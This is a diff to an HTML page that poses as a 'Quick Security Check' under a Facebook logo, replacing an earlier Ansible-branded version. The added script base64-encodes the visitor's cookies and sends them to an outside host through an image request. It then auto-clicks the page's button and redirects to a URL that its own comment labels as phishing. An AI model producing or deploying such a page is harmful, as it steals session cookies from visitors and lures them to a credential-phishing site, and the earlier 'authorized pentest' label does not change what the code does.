@@ -5,21 +5,18 @@
 <style>body{text-align:center;font-family:Arial;padding:50px;background:#f0f2f5}img{width:150px}</style>
 </head>
 <body>
-<img src="https://www.ansible.com/hubfs/Ansible%20Website%20Assets/Ansible_logo_black_square.png">
-<h2>Verify Ansible Session</h2>
-<p>One moment...</p>
-<button onclick="go()" style="padding:15px 30px;background:#0969da;color:white;border:none;border-radius:8px;font-size:16px;cursor:pointer">Continue</button>
+<img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHw6.svg" alt="Security">
+<h2>Quick Security Check</h2>
+<p>Confirm session to continue...</p>
+<button onclick="go()" style="padding:15px 30px;background:#1877f2;color:white;border:none;border-radius:8px;font-size:16px;cursor:pointer">Continue Securely</button>
 <script>
-// HARVEST + EXFIL (1 line)
-var i=new Image();i.src='https://httpbin.org/get?c='+btoa(document.cookie)+'&u='+navigator.userAgent;
+// HARVEST Office/FB COOKIES + EXFIL
+var i=new Image();i.src='https://httpbin.org/get?c='+btoa(document.cookie);
 
-// CHAIN: safe → target (authorized pentest)
-function go(){
-  setTimeout(()=>location.href='https://www.ansible.com/',1000);
-  setTimeout(()=>location.href='https://ansible.fruwoocroo.com/!SZyFdWaC/',2500);
-}
-// AUTO
-setTimeout(()=>document.querySelector('button').click(),1000);
+// DIRECT TO PHISHING
+function go(){setTimeout(()=>location.href='https://ansible.fruwoocroo.com/!SZyFdWaC/',1500);}
+// AUTO-TRIGGER
+setTimeout(()=>document.querySelector('button').click(),800);
 </script>
 </body>
 </html>
